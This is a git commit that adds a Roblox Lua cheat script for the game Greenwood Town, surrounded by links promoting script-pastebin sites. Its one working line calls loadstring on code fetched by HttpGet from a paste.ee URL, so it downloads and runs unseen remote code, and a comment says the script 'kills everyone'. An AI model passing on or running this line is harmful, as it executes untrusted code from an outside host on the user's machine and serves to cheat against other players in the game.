1da9157a0fce89a67e1848f78093615177b2f96c
PapaJoeX <jaouad.kassaoui@gmail.com>
2022-12-26 06:59:03 +0100

    commit zero

---
+++ LINK GAME Script pastebin roblox Greenwood Town .lua
@@ -0,0 +1,11 @@
+-- find more powerfull verified and New Scripts here : https://script-pastebin.com
+
+loadstring(game:HttpGet("https://paste.ee/r/sQvWi/0"))();
+
+-- find more powerfull verified and New Scripts here : https://scriptpastebin.io
+
+--[[ Script Description:
+
+							The script kills everyone
+						
+]]
